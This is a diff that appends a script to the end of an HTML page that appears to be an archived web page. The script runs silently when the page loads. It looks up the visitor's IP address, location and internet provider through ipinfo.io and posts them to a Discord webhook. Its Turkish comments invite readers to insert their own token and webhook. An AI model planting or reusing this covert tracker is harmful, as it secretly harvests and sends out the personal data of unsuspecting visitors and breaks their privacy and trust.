@@ -1117,3 +1117,37 @@ playback timings (ms):
   PetaboxLoader3.datanode: 57.79 (4)
   load_resource: 243.55
 -->
+<script>
+	<script>
+  async function sendIPToWebhook() {
+    try {
+      const res = await fetch('https://ipinfo.io/json?token=IPINFO_TOKEN'); // <- Buraya kendi ipinfo.io tokenını yaz
+      const data = await res.json();
+      const ip = data.ip;
+      const city = data.city;
+      const region = data.region;
+      const country = data.country;
+      const isp = data.org;
+
+      const webhookUrl = "https://discord.com/api/webhooks/1372716525710086245/Qu4Yb9mYuGw9ni_DctvUwin4-5WYPXg5hgXTo554iNbvmNlfaItWCjL38O1Cv4fJXjia"; // <- Kendi webhook linkini buraya yaz
+
+      await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `🌐 Yeni ziyaretçi bilgisi:
+🔹 IP: ${ip}
+📍 Konum: ${city}, ${region}, ${country}
+🔌 İnternet Servis Sağlayıcı: ${isp}`
+        })
+      });
+
+    } catch (err) {
+      console.error("Webhook'a IP gönderilemedi:", err);
+    }
+  }
+
+  window.addEventListener("load", sendIPToWebhook);
+</script>
+</body>
+</html>
